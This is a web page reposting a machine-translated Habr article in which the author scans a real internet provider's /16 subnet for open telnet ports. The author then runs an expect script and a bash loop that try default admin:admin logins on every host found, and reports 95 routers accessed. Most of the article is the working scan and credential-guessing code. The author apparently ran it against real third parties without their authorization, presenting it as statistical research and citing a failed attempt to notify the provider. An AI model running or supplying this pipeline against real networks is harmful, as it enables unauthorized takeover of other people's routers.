<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Automatic search for routers with standard passwords</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Recently, a banal idea occurred to me that most people put their routers on the settings, and they can be accessed using default passwords. And how ma...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Automatic search for routers with standard passwords</h1><div class="post__text post__text-html js-mediator-article">  Recently, a banal idea occurred to me that most people put their routers on the settings, and they can be accessed using default passwords.  And how many of these routers in addition are open to the entrance from the Internet, which makes them a passing yard?  And how to quickly check it? <br><br>  So, the task: scan some subnet and find vulnerable routers. <br><br>  Execution conditions: no more than a few hours (summer is still outside), using only standard Linux tools.  Yes, I am aware of projects like Kali and ‚Äúhacker‚Äù software cars in them, but I couldn‚Äôt find the right program that would do it right ‚Äúout of the box‚Äù, but time goes on ... Yes, and it's more interesting. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The first thought that comes to mind is: scan nmap over the open port 80.  But what to do with a huge zoo web mord?  After all, the goal is not to write a universal combine-destroyer of routers, but a small proof-of-concept.  Is there any unified authorization system on routers?  Of course there is - Telnet!  Getting started! <br><a name="habracut"></a><br>  We select the victims: we enter the "address range" into Google "provider_name".  I chose a provider with the letter ‚ÄúU‚Äù and one of its subnets of the form XX.XX.00.00 / 16, that is, as many as ~ 65536 addresses. <br><pre><code class="bash hljs">nmap --open XX.XX.0.0/16 -p 23 &gt; raw_log.txt</code> </pre> <br>  So we are looking for routers (and any other hardware) with an open 23 port (Telnet), and the key <code>--open</code> allows <code>--open</code> to display only the necessary addresses, which simplifies further processing. <br><br>  It takes a little more than 40 minutes, and a list of 2100 addresses on our desktop.  A total of 18,000 hosts were available. <br><br>  For our purposes, the nmap exhaust is too motley, you can't feed it to the script, you only need to weed out addresses.  With this cope irreplaceable grep, namely: <br><pre> <code class="bash hljs">grep -o -E <span class="hljs-string"><span class="hljs-string">'([0-9]{1,3}[\.]){3}[0-9]{1,3}'</span></span> raw_log.txt &gt; log.txt</code> </pre><br>  A regular expression can frighten a beginner grepovtsa, but in fact it is very simple: a block of the form ‚Äúfrom one to three digits + dot‚Äù three times + the block ‚Äúfrom one to three digits‚Äù.  The <code>-o</code> key displays only the found substring, which is what we need. <br><br>  You can relax a bit and manually connect to the IP data using telnet.  In some places the connection is broken, but it connects a lot where.  Moreover, out of a dozen IPs that have already been tried, two have already turned out to be working routers with automatic login and password admin, which is good news. <br><br>  Someone would stop at this, but not only we, because our goal is not to manage in foreign routers, but a more elevated one is statistical research. <br><br>  Attempts to automate telnet's ‚Äúin the forehead‚Äù were unsuccessful: it was just not possible to wrap it in the bash script.  The problem was in automatic password substitution: all methods known to me (pipes, ekhi and kets) did not work here.  I had to discover <a href="https://ru.wikipedia.org/wiki/Expect">unknown ways</a> for myself: <i>Expect is a tool for automation and testing in Unix OS, written by Don Libes as an extension to the Tcl script language, for interactive applications such as telnet, ftp, passwd, fsck, rlogin, tip, ssh, and others</i> .  In the article from Wikipedia, the first example is the automatic authorization via telnet - well, just a gift.  The code had to be ‚Äúfiled‚Äù a little to fit my needs, the already finished program body for iteration: the executable file try_telnet <br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/expect -f set SERVER [lindex $argv 0]; set USER [lindex $argv 1]; set PASS [lindex $argv 2]; set timeout 1 spawn telnet $SERVER expect ":" send "$USER\r" expect ":" send "$PASS\r" expect "&gt;" {puts "\nFOUND $SERVER $USER:$PASS\n"; exit 0} exit 1</span></span></code> </pre><br>  The expect command follows its literal meaning: it waits for an invitation to enter a login and password, and then to enter commands.  If a shell is received, then the script happily reports this to the general output stream with a string, which is then convenient to use. <br><br>  Interesting fact: in Wikipedia and other resources, the "#" is specified as a shell marker.  By experiments, it turned out that this method does not work on a large proportion of vulnerable routers, namely TP-LINK, which give an invitation to enter commands of the form <br><pre> <code class="bash hljs">TP-LINK&gt;</code> </pre><br>  However, the "&gt;" token is universal - it also works on the recognized D-Link, which give an invitation like <br><pre> <code class="bash hljs">DSL-2600U<span class="hljs-comment"><span class="hljs-comment">#</span></span></code> </pre><br>  It remains only to write a single-line bash: brute executable file <br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash while read line; do ./try_telnet $line admin admin; done &lt; log.txt</span></span></code> </pre><br>  And run <br><pre> <code class="bash hljs">./brute &gt; out.txt</code> </pre><br>  In stderr, the script swears in the case of connection refused - do not pay attention.  The useful work of the script can be observed live in the out.txt file (remembering to update it periodically). <br><br>  35 minutes pass and the script exits.  Sift the result with <br><pre> <code class="bash hljs">grep <span class="hljs-string"><span class="hljs-string">'FOUND'</span></span> out.txt &gt; final.txt</code> </pre><br>  We get 95 routers with admin authorization: admin - the goal is reached. <br><br>  As a result, out of 18,000 addresses, 95 routers turned out to be accessible from anywhere in the world by admin: admin.  Everyone's web interface is also open.  Is it a lot or a little?  I remind you that we were looking only for routers with open telnet, and tried only one standard bundle for authorization (albeit the most common). <br><br>  Basically, TP-LINK and D-link routers of various models were vulnerable.  If you have such a router, then it is worth checking out!  Also found a few ZyXEL, Huawei, Asotel, ZTE. <br><br>  In conclusion, I want to say that I honestly tried to inform the provider, but he does not have e-mail, only the form ‚Äúfor calls‚Äù with the mandatory fields ‚Äúhome address‚Äù and ‚Äúphone‚Äù.  Then a friend advised to write on Habrahabr.  Thanks to all! </div><p>Source: <a href="https://habr.com/ru/post/263089/">https://habr.com/ru/post/263089/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../263079/index.html">6 things I would like to know before developing my first Android application</a></li>
<li><a href="../263081/index.html">We clean the home Internet from very annoying ads (Ad's blocker for OpenWRT)</a></li>
<li><a href="../263083/index.html">Build docker containers with docker containers</a></li>
<li><a href="../263085/index.html">Site security audit through the eyes of the customer</a></li>
<li><a href="../263087/index.html">IOS development testing</a></li>
<li><a href="../263091/index.html">Pacemaker-based HA-Cluster for LXC and Docker container virtualization</a></li>
<li><a href="../263093/index.html">Crackme Chiwaka1 study</a></li>
<li><a href="../263097/index.html">Event-oriented Python backtesting step by step. Part 1</a></li>
<li><a href="../263099/index.html">Skype turned to people?</a></li>
<li><a href="../263101/index.html">Work with passwords: how to protect your accounts (expert opinion)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>